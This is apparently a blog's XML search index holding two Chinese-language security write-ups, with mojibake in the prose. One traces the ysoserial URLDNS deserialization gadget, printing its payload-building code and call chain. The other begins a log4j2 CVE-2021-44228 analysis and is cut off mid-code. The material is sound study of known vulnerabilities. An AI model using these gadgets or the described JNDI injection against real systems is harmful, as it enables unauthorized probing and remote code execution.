<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ysoserial URLDNSåˆ†æ</title>
      <link href="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/"/>
      <url>/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘åœ¨å­¦ä¹ pç‰›çš„ã€Šjavaå®‰å…¨æ¼«è°ˆã€‹ï¼Œæ–‡ä¸­è®¸å¤šç®€åŒ–ç‰ˆæ˜“äºç†è§£çš„demoï¼Œæ ¹æ®å¯¹demoçš„ç†è§£ç»“åˆ<code>ysoserial</code>æºç å­¦ä¹ javaååºåˆ—åŒ–ï¼Œå¯¹<code>ysoserial</code>æºç åˆ†æè¿‡ç¨‹åšä¸‹è®°å½•ï¼Œæœ¬æ–‡å…ˆè®°å½•ä¸‹URLDNSçš„åˆ†æè¿‡ç¨‹ï¼Œåç»­å†ç»§ç»­å­¦ä¹ è®°å½•æ‰€æœ‰CCé“¾çš„åˆ†æè¿‡ç¨‹ï¼Œå†²å†²å†²ã€‚</p><h2 id="åˆ†æè¿‡ç¨‹"><a href="#åˆ†æè¿‡ç¨‹" class="headerlink" title="åˆ†æè¿‡ç¨‹"></a>åˆ†æè¿‡ç¨‹</h2><h3 id="å¦‚ä½•è°ƒè¯•ysoserial"><a href="#å¦‚ä½•è°ƒè¯•ysoserial" class="headerlink" title="å¦‚ä½•è°ƒè¯•ysoserial"></a>å¦‚ä½•è°ƒè¯•ysoserial</h3><p><code>ysoserial</code>æ‰€æœ‰payloadéƒ½æ”¾åœ¨<code>src/main/java/ysoserial/payloads</code>ç›®å½•ï¼Œç›®å½•ä¸‹æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ª<code>main</code>æ–¹æ³•ï¼Œæˆ‘ä»¬è¦è°ƒè¯•å“ªä¸ªåˆ©ç”¨é“¾ï¼Œåªéœ€è¦è°ƒè¯•å¯¹åº”çš„javaæ–‡ä»¶å³å¯ï¼Œä¾‹å¦‚URLDNS.javaçš„<code>main</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">               PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p><code>payloads</code>ç›®å½•ä¸‹æ‰€æœ‰çš„<code>main</code>æ–¹æ³•éƒ½ä¼šè°ƒç”¨<code>PayloadRunner.run()</code>ï¼Œè·Ÿè¿›<code>PayloadRunner.run()</code>æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°ä¸»è¦é€»è¾‘æ˜¯å°†ä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°å®ä¾‹åŒ–åè°ƒç”¨è¯¥ç±»çš„<code>getObject</code>æ–¹æ³•ï¼Œæ¥ç€å°†<code>getObject</code>æ–¹æ³•çš„è¿”å›çš„å¯¹è±¡åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œæ‰€ä»¥åˆ©ç”¨é“¾çš„æ„é€ é€»è¾‘ä¸»è¦åœ¨<code>getObject</code>æ–¹æ³•å†…ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">final</span> Class&lt;? extends ObjectPayload&lt;?&gt;&gt; clazz, <span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">   <span class="comment">// ensure payload generation doesn&#x27;t throw an exception</span></span><br><span class="line">   <span class="keyword">byte</span>[] serialized = <span class="keyword">new</span> ExecCheckingSecurityManager().callWrapped(<span class="keyword">new</span> Callable&lt;<span class="keyword">byte</span>[]&gt;()&#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">byte</span>[] call() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">         <span class="keyword">final</span> String command = args.length &gt; <span class="number">0</span> &amp;&amp; args[<span class="number">0</span>] != <span class="keyword">null</span> ? args[<span class="number">0</span>] : getDefaultTestCmd();</span><br><span class="line"></span><br><span class="line">         System.out.println(<span class="string">&quot;generating payload object(s) for command: &#x27;&quot;</span> + command + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">         ObjectPayload&lt;?&gt; payload = clazz.newInstance();</span><br><span class="line">               <span class="keyword">final</span> Object objBefore = payload.getObject(command);</span><br><span class="line"></span><br><span class="line">         System.out.println(<span class="string">&quot;serializing payload&quot;</span>);</span><br><span class="line">         <span class="keyword">byte</span>[] ser = Serializer.serialize(objBefore);</span><br><span class="line">         Utils.releasePayload(payload, objBefore);</span><br><span class="line">               <span class="keyword">return</span> ser;</span><br><span class="line">   &#125;&#125;);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;deserializing payload&quot;</span>);</span><br><span class="line">      <span class="keyword">final</span> Object objAfter = Deserializer.deserialize(serialized);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>æ¥çœ‹ä¸‹URLDNSçš„<code>getObject</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">        <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">        URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">        HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">        URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">        ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œå°†ä¸€ä¸ª<code>URL</code>å¯¹è±¡putåˆ°<code>HashMap</code>çš„keyï¼Œå†å°†<code>URL</code>çš„<code>hashCode</code>è®¾ç½®ä¸º<code>-1</code>åè¿”å›ï¼Œ11è¡Œæ³¨é‡ŠæŒ‡å‡ºäº†åªæœ‰<code>hashCode</code>è®¾ç½®<code>-1</code>æ‰èƒ½è§¦å‘DNSè¯·æ±‚ã€‚</p><p>è§¦å‘ååºåˆ—åŒ–çš„æ–¹æ³•æ˜¯åœ¨<code>readObject</code>æ–¹æ³•ï¼Œä¸Šé¢<code>getObject</code>è¿”å›çš„æ˜¯ä¸€ä¸ªHashMapå¯¹è±¡ï¼Œæ‰€ä»¥å…ˆçœ‹ä¸‹<code>HashMap</code>ç±»çš„<code>readObject</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>hash</code>å‡½æ•°åœ¨41è¡Œï¼Œæ‰€ä»¥ç›´æ¥åœ¨41è¡Œä¸‹æ–­ç‚¹</p><img src="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/image-20220225103112305.png" class="" title="image-20220225103112305"><p>è·Ÿè¿›<code>hash</code>å‡½æ•°ï¼Œæ¥ç€è°ƒç”¨äº†URLçš„<code>hashCode</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨URLç±»çš„<code>hashCode</code>å¯ä»¥çœ‹åˆ°<code>hashCode</code>ä¸º<code>-1</code>æ‰å¾€ä¸‹èµ°ï¼Œæ‰€ä»¥å‰é¢<code>getObject</code>å‡½æ•°ä¸­æ‰ä¼šå°†<code>hashCode</code>è®¾ç½®ä¸º<code>-1</code>ï¼Œæ¥ç€è°ƒç”¨<code>URLStreamHandler</code> å¯¹è±¡çš„<code>hashcode</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿå…¥<code>hashCode</code>ï¼Œå°†URLä¼ å…¥çš„<code>getHostAddress</code>æ–¹æ³•</p><img src="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/image-20220225105425560.png" class="" title="image-20220225105425560"><p>è·Ÿè¿›<code>getHostAddress</code>æ–¹æ³•ï¼Œé€šè¿‡<code>InetAddress.getByName</code>å°†ä¸»æœºåè½¬åŒ–ä¸ºIPï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œä¸€æ¬¡DNSæŸ¥è¯¢</p><img src="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/image-20220225105549303.png" class="" title="image-20220225105549303"><p>æŸ¥çœ‹ç¬¬ä¸‰æ–¹åè¿å¹³å°ï¼Œæ¥æ”¶åˆ°äº†DNSè¯·æ±‚ï¼Œè¯´æ˜ç¡®å®å­˜åœ¨ååºåˆ—åŒ–æ¼æ´</p><img src="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/image-20220225105815270.png" class="" title="image-20220225105815270"><p>è°ƒç”¨é“¾å¦‚ä¸‹</p><img src="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/image-20220225111335501.png" class="" title="image-20220225111335501"><p>æ‰€ä»¥URLDNSçš„<code>Gadget</code>ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">-&gt;HashMap.hash()</span><br><span class="line">-&gt;URL.hashCode()</span><br><span class="line">-&gt;URLStreamHandler.hashCode()</span><br><span class="line">-&gt;URLStreamHandler.getHostAddress()</span><br><span class="line">-&gt;InetAddress.getByName()</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>URLDNSè°ƒè¯•èµ·æ¥ç®€å•æ¸…æ™°ï¼Œç¡®å®æ¯”è¾ƒé€‚åˆåƒæˆ‘è¿™ç§å…¥é—¨çº§é€‰æ‰‹åˆæ¬¡è°ƒè¯•ååºåˆ—æµç¨‹ï¼ŒURLDNSåªèƒ½è§¦å‘DNSè¯·æ±‚ï¼Œå¹¶ä¸èƒ½è¯´æ˜¯ä¸€ä¸ªåˆ©ç”¨é“¾ï¼Œæ‰€ä»¥é€šå¸¸ç”¨URLDNSæ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a class="link"   href="https://wx.zsxq.com/dweb2/index/topic_detail/548242484442524" >ã€ŠJavaå®‰å…¨æ¼«è°ˆ - 08.è®¤è¯†æœ€ç®€å•çš„Gadgetâ€”â€”URLDNSã€‹<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://github.com/frohoff/ysoserial" >ysoserialé¡¹ç›®<i class="fas fa-external-link-alt"></i></a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>log4j2 RCEåˆ†æä¸å¤ç°</title>
      <link href="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>å»å¹´12æœˆä»½çˆ†å‡ºäº†<code>log4j2 RCE</code>çš„æ¼æ´ï¼ˆ<code>CVE-2021-44228</code>ï¼‰ï¼Œè¯¥æ¼æ´åˆ©ç”¨éš¾åº¦ä½ï¼Œå±å®³å¤§ï¼Œä¸”å½±å“èŒƒå›´å¹¿æ³›ï¼Œè¿™å°†æœ‰å¯èƒ½æ˜¯è½½å…¥å®‰å…¨å²å†Œçš„æ¼æ´ï¼Œä½œä¸ºå²è¯—çº§æ¼æ´çš„è§è¯è€…ï¼Œå†™ä¸ªæ¼æ´åˆ†æç•™ä¸ªåº•è¿˜æ˜¯æœ‰å¿…è¦çš„ğŸ˜„</p><h2 id="0x00-æ¼æ´å¤ç°"><a href="#0x00-æ¼æ´å¤ç°" class="headerlink" title="0x00 æ¼æ´å¤ç°"></a>0x00 æ¼æ´å¤ç°</h2><p>å¤ç°æ¯”è¾ƒç®€å•ï¼Œå…ˆå¼•å…¥<code>log4j</code> ç‰ˆæœ¬<code>2.14.1</code>çš„åŒ…ï¼Œæˆ‘è¿™é‡Œé…çš„æ˜¯<code>lombok</code>+<code>sprint-boot-starter-log4j2</code>ï¼Œ<code>starter 2.5.7</code>ä¾èµ–çš„æ˜¯<code>2.14.1</code>ç‰ˆæœ¬çš„log4j</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123122258173.png" class="" title="image-20220123122258173"><p>æˆ–è€…æ¢åšç›´æ¥å¼•<code>log4j</code>çš„åŒ…ä¹Ÿæ˜¯OKçš„ã€‚</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220219150315768.png" class="" title="image-20220219150315768"><p>é€šè¿‡JNDIæ³¨å…¥åˆ©ç”¨<a class="link"   href="https://github.com/welk1n/JNDI-Injection-Exploit" >å·¥å…·<i class="fas fa-external-link-alt"></i></a>åœ¨æœ¬åœ°å¯åŠ¨JNDIæœåŠ¡ï¼Œæ ¹æ®é¡¹ç›®JDKç‰ˆæœ¬åœ¨<code>log.error</code>ä¸­æ’å…¥å¯¹åº”payloadå³å¯è§¦å‘</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123155520880.png" class="" title="image-20220123155520880"><h2 id="0x01-ä»£ç åˆ†æ"><a href="#0x01-ä»£ç åˆ†æ" class="headerlink" title="0x01 ä»£ç åˆ†æ"></a>0x01 ä»£ç åˆ†æ</h2><h3 id="æ—¥å¿—è®°å½•"><a href="#æ—¥å¿—è®°å½•" class="headerlink" title="æ—¥å¿—è®°å½•"></a>æ—¥å¿—è®°å½•</h3><p>è·Ÿå…¥erroræ–¹æ³•ï¼Œåœ¨<code>AbstractLogger</code>ç±»çš„<code>logIfEnabled</code>æ–¹æ³•ä¸­è¿›è¡Œä¸€å±‚åˆ¤æ–­ï¼Œæ»¡è¶³äº†é…ç½®çš„logç­‰çº§æ‰è¾“å‡ºæ—¥å¿—</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">logIfEnabled</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isEnabled(level, marker, message)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logMessage(fqcn, level, marker, message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿåˆ°<code>isEnabled</code>æ–¹æ³•ä¸‹é¢çœ‹çœ‹æ˜¯æ€ä¹ˆåˆ¤æ–­ï¼Œå¯ä»¥çœ‹åˆ°filteræ–¹æ³•ä¸­302è¡Œä¼šåˆ¤æ–­ä¼ å…¥çš„levelæ˜¯å¦å¤§äºé…ç½®çš„levelï¼Œæ—¥å¿—è¾“å‡ºç­‰çº§ä»ä½åˆ°é«˜æ˜¯<code>All &lt; Trace &lt; Debug &lt; Info &lt; Warn &lt; Error &lt; Fatal &lt; OFF</code>ï¼Œç¨‹åºä¼šæ‰“å°é«˜äºæˆ–ç­‰äºæ‰€è®¾ç½®çº§åˆ«çš„æ—¥å¿—ï¼Œè€Œé»˜è®¤é…ç½®ä¸º<code>error</code>ç­‰çº§ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆé»˜è®¤é…ç½®ä¸‹<code>error</code>å’Œ<code>fatal</code>å¯ä»¥è§¦å‘ï¼Œè€Œ<code>debug/info/warn</code>è§¦å‘ä¸äº†çš„åŸå› ã€‚</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123163628452.png" class="" title="image-20220123163628452"><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ä¿®æ”¹log4j2.xmlé…ç½®æ¥é…ç½®æ—¥å¿—è¾“å‡ºç­‰çº§</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220219145944559.png" class="" title="image-20220219145944559"><p>æ¥ç€ä»<code>logMessage</code>æ–¹æ³•å¾€ä¸‹è·Ÿåˆ°<code>AbstractOutputStreamAppender</code>ç±»çš„<code>directEncodeEvent</code>æ–¹æ³•ï¼Œ89è¡Œè·Ÿå…¥<code>encode</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">directEncodeEvent</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// è·Ÿå…¥</span></span><br><span class="line">    <span class="keyword">this</span>.getLayout().encode(event, <span class="keyword">this</span>.manager);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.immediateFlush || event.isEndOfBatch()) &#123;</span><br><span class="line">        <span class="keyword">this</span>.manager.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>PatternLayout</code>ç±»å®ç°<code>encode</code>æ–¹æ³•ï¼Œæ¥ç€å…³æ³¨<code>toText</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">encode</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> ByteBufferDestination destination)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="keyword">this</span>.eventSerializer <span class="keyword">instanceof</span> Serializer2)) &#123;</span><br><span class="line">        <span class="keyword">super</span>.encode(event, destination);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// è·Ÿå…¥toTextæ–¹æ³•</span></span><br><span class="line">        StringBuilder text = <span class="keyword">this</span>.toText((Serializer2)<span class="keyword">this</span>.eventSerializer, event, getStringBuilder());</span><br><span class="line">        Encoder&lt;StringBuilder&gt; encoder = <span class="keyword">this</span>.getStringBuilderEncoder();</span><br><span class="line">        encoder.encode(text, destination);</span><br><span class="line">        trimToMaxSize(text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> StringBuilder <span class="title">toText</span><span class="params">(<span class="keyword">final</span> Serializer2 serializer, <span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder destination)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> serializer.toSerializable(event, destination);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¶ˆæ¯æ ¼å¼åŒ–"><a href="#æ¶ˆæ¯æ ¼å¼åŒ–" class="headerlink" title="æ¶ˆæ¯æ ¼å¼åŒ–"></a>æ¶ˆæ¯æ ¼å¼åŒ–</h3><p>è·Ÿå…¥<code>toSerializable</code>æ–¹æ³•ï¼Œéå†ç±»å‹ä¸º<code>org.apache.logging.log4j.core.pattern.PatternFormatter</code>ç±»çš„<code>formatters</code>æ•°ç»„ï¼Œè°ƒç”¨å…¶<code>format</code>æ–¹æ³•ï¼Œè¿™é‡Œåªéœ€å…³æ³¨ç¬¬8æ¬¡å¾ªç¯çš„<code>format</code>æ–¹æ³•ï¼Œæ¼æ´å°±æ˜¯åœ¨è¿™ä¸ª<code>format</code>ä¸­è§¦å‘</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123174526935.png" class="" title="image-20220123174526935"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.skipFormattingInfo) &#123;</span><br><span class="line">        <span class="comment">// 